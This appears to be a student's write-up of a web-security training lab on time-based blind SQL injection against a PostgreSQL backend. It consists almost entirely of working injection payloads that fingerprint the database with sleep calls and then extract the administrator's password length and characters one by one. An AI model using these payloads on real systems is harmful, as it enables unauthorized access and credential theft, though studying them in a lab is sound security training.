Lab 14: Blind SQL injection with time delays and information retrieval

Main Goal:

Grab username and password of administrator user from users table
login as administrator user

Analysis:

(1) Find out which database type we are using
' || (SELECT SLEEP(10))--     --> not mysql

' || (SELECT pg_sleep(10))--  --> yes, its PostgreSql

(2) Now , we need to find out users table exist in db

' || (SELECT CASE WHEN (SELECT EXISTS(SELECT 1 FROM information_schema.tables
WHERE table_name = 'users')) THEN pg_sleep(10)
ELSE pg_sleep(0) END)--

----------- both payload works------------------

' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10)
ELSE pg_sleep(0) END from users)--


(3) We have to find out password length

' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10)
else pg_sleep(0) end from users)--

password length=0-19

(4) Find password of administrator

' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10)
else pg_sleep(0) end from users)--

1 to 20
